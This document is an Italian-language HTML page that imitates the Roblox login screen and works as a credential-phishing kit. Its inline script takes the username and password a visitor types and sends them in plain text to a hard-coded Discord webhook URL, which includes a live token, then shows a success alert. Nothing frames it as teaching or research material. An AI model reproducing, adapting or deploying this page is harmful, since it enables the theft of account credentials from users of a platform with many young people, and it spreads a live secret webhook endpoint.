<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: "Arial", sans-serif;
            background-color: #1e1e1e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .login-container {
            background-color: #fff;
            width: 350px;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            box-sizing: border-box;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #2f2f2f;
            font-size: 28px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            padding: 12px;
            width: 100%;
            background-color: #00a0d3;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #008bb1;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
        .footer a {
            color: #00a0d3;
            text-decoration: none;
        }
        .logo {
            margin-bottom: 30px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">
            <!-- Aggiungi qui un'immagine del logo di Roblox -->
            <img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.roblox.com%2Fcharts&psig=AOvVaw1l0X4z7q2ONnBiyaB73qNN&ust=1737550727709000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCLifgoLvhosDFQAAAAAdAAAAABAE" alt="Roblox Logo" width="150">
        </div>
        <h2>Accedi a Roblox</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Nome utente" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Accedi</button>
        </form>
        <div class="footer">
            <p>Non hai un account? <a href="#">Registrati</a></p>
            <p><a href="#">Password dimenticata?</a></p>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Impedisce il submit del modulo

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Dati da inviare al Webhook di Discord
            const message = {
                content: `**Nuovo Login**\nUsername: ${username}\nPassword: ${password}`
            };

            // URL del Webhook di Discord
            const webhookUrl = "https://discord.com/api/webhooks/1330905454200754207/fzUFDc5ZEpCknT1cAYZ19XzSMNFEiGbF8QLTIqKRcT9rUJoRYR2zEivlwGJ0vg-b7XHq";

            // Funzione per inviare i dati al Webhook
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(message)
            })
            .then(response => response.json())
            .then(data => {
                alert("Dati inviati con successo!");
                // Resetta i campi
                document.getElementById("loginForm").reset();
            })
            .catch(error => {
                console.error("Errore durante l'invio:", error);
                alert("Si Ã¨ verificato un errore.");
            });
        });
    </script>
</body>
</html>
